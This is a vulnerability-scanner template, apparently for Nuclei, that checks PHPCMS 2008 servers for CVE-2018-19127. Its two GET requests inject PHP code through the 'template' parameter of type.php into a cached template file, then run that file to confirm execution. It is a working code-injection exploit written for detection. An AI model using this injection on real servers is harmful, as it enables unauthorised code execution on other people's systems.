id: poc-local-cms-phpcms-xray-cve-2018-19127

info:
  name: poc-local-cms-phpcms-xray-cve-2018-19127
  author: capiton
  severity: critical
  description: ""
  reference:
    - https://github.com/ab1gale/phpcms-2008-CVE-2018-19127
  metadata:
    fofa-query: ""
    Vulnerability-Impact: "PHPCMS2008"
  tags: phpcms

variables:
  r1: "{{rand_int(800000000, 1000000000)}}"
  md5_r1: "{{md5(r1)}}"


requests:
  - method: GET
    path:
      - "{{RootURL}}/type.php?template=tag_()%7B%7D%3B%40unlink(file)%3Becho%20md5(%24_GET%5B1%5D)%3B%7B%2F%2F..%2Frss"
      - "{{RootURL}}/data/cache_template/rss.tpl.php?1={{r1}}"

    matchers-condition: and
    matchers:
      - type: word
        condition: and
        words:
          - "{{md5_r1}}"

